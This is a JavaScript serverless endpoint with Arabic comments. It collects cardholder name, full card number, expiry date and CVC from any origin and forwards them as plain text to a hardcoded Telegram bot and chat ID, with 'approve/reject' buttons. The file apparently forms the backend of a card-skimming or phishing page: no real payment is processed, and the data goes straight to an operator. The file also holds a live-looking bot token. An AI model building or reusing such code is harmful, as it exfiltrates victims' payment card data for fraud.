export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  // ضع هنا توكن البوت الجديد الذي أخذته من BotFather
  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  
  // ضع هنا الـ Chat ID الخاص بك على تليجرام
  const CHAT_ID = "8040433133";
  
  const data = req.body;

  const text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
               `👤 الاسم: ${data.card_name || 'غير محدد'}\n` +
               `💳 رقم البطاقة: \`${data.card_number || ''}\`\n` +
               `📅 الانتهاء: ${data.exp_date || ''}\n` +
               `🔒 CVC: \`${data.cvc || ''}\`\n` +
               `🆔 معرف المستخدم: \`${data.user_id}\``;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_pay_${data.user_id}` },
        { text: "❌ رفض", callback_data: `reject_pay_${data.user_id}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });
    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
